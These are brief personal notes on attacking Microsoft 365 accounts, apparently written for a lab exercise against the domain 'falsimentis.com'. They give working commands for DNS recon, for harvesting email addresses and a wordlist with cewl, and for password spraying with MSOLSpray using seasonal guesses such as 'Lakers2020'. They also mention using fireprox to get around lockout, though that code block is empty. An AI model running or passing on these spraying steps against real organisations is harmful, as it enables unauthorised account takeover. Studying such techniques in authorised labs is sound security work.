# Attacking microsoft 365 passwords notes

recon

```
dig +short @172.30.0.254 MX falsimentis.com
dig +short @172.30.0.254 CNAME autodiscover.falsimentis.com
```

visit these sites and enumerate to understand more, in this case we find emails so let's use cewl to extract them out

```
cewl -d 8 -w words.txt -e --email_file email.txt http://www.falsimentis.com/
```

above will create a words list named words.txt and an email file list named email.txt

## MSOLSpray

now spary these with MSOLSpray tool
[MSOLSpray](https://github.com/dafthack/MSOLSpray)

```
Import-Module /opt/MSOLSpray/MSOLSpray.ps1
Invoke-MSOLSpray -UserList ./email.txt -Password Lakers2020
Invoke-MSOLSpray -UserList ./email.txt -Password Dodgers2020
```

smartlock will lock these so instead let's use fireprox

```

```
